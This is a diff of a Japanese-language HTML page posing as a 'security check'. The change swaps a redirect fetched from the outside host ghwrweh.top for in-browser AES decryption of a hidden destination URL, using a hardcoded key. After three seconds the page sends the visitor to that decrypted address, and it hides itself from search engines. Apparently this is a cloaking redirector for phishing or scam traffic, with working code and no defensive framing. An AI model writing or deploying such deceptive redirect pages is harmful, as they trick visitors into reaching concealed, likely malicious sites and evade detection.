@@ -3,24 +3,84 @@
 <head>
   <meta charset="UTF-8">
   <title>セキュリティ確認中...</title>
-  <script>
-    fetch('https://ghwrweh.top/api/jumpSite?siteName=MnyreIZH')
-      .then(res => res.json())
-      .then(data => {
-        if (data && data.data && data.data.siteUrl) {
-          location.href = data.data.siteUrl;
-        }
-      })
-  </script>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <meta name="robots" content="noindex,nofollow">
   <style>
-    body { background: #f6f6f6; font-family: sans-serif; text-align: center; padding-top: 100px; }
-    .loader { border: 6px solid #f3f3f3; border-top: 6px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: auto; }
-    @keyframes spin { 100% { transform: rotate(360deg); } }
+    body {
+      font-family: "Segoe UI", "Hiragino Kaku Gothic ProN", sans-serif;
+      background-color: #f9f9f9;
+      text-align: center;
+      padding-top: 120px;
+      color: #333;
+    }
+    .loader {
+      border: 6px solid #f3f3f3;
+      border-top: 6px solid #3498db;
+      border-radius: 50%;
+      width: 50px;
+      height: 50px;
+      animation: spin 1s linear infinite;
+      margin: 30px auto;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    .caption {
+      font-size: 14px;
+      color: #666;
+    }
   </style>
 </head>
 <body>
-  <h2>安全確認中です...</h2>
-  <p>このリクエストが自動でないことを確認しています。</p>
+  <h2>セキュリティ確認中...</h2>
+  <p>リンクの安全性を確認しています。まもなくページが表示されます。</p>
   <div class="loader"></div>
+  <p class="caption">セキュア認証サービス</p>
+  <script>
+    const AES_KEY = "5Ctianyoumabiiii";
+
+    async function decryptAES(encText) {
+      const base64 = encText.replace(/-/g, '+').replace(/_/g, '/');
+      const bytes = Uint8Array.from(atob(base64), c => c.charCodeAt(0));
+      const iv = bytes.slice(0, 16);
+      const data = bytes.slice(16);
+      const key = await crypto.subtle.importKey(
+        "raw",
+        new TextEncoder().encode(AES_KEY),
+        { name: "AES-CBC" },
+        false,
+        ["decrypt"]
+      );
+      const decrypted = await crypto.subtle.decrypt(
+        { name: "AES-CBC", iv },
+        key,
+        data
+      );
+      return new TextDecoder().decode(decrypted).replace(/\u0000+$/, '');
+    }
+
+    async function start() {
+      const path = window.location.pathname;
+      const id = path.split('/').filter(Boolean).pop()?.split('.')[0];
+      if (!id) return;
+
+      const url = `/get_url?id=${encodeURIComponent(id)}`;
+      try {
+        const res = await fetch(url);
+        const json = await res.json();
+        if (json.enc) {
+          const realUrl = await decryptAES(json.enc);
+          setTimeout(() => location.href = realUrl, 3000);
+        } else {
+          document.body.innerHTML += "<p style='color:red'>リダイレクト失敗。</p>";
+        }
+      } catch (e) {
+        document.body.innerHTML += "<p style='color:red'>接続エラー。</p>";
+      }
+    }
+
+    start();
+  </script>
 </body>
 </html>
